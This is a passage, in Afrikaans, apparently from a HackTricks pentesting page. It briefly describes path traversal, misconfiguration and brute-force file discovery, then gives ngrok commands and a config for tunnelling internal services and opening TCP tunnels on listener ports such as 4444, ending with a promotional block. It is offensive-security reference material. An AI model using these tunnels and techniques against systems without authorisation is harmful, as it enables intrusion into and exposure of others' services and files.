2. **Path Traversal**: Hierdie tegniek maak gebruik van spesiale karakters soos "../" om toegang te verkry tot lêers buite die huidige directory. Deur hierdie karakters in die URL in te voer, kan jy die pad na die gewenste lêer verander en dit blootstel.

3. **Server Misconfigurations**: Soms word lêers per ongeluk blootgestel as gevolg van verkeerde konfigurasies op die bediener. Deur te soek na spesifieke URL-patrone of deur gebruik te maak van 'n webkruiper, kan jy moontlik blootgestelde lêers vind.

4. **Brute Forcing**: As jy 'n idee het van die naam van 'n lêer, kan jy 'n woordelysaanval uitvoer om die lêer te vind. Dit behels die outomatiese poging van verskillende lêernaamkombinasies totdat die regte een gevind word.

Dit is belangrik om te onthou dat die blootstelling van lêers sonder toestemming onwettig is en dat jy slegs hierdie tegnieke moet gebruik vir wettige doeleindes, soos etiese hakwerk of pentesting.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP-oproepe

*Handig vir XSS, SSRF, SSTI ...*
Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling interne HTTP-diens
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasie-voorbeeld

Dit maak 3 tonnels oop:
- 2 TCP
- 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Ander gereedskap om te kontroleer

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
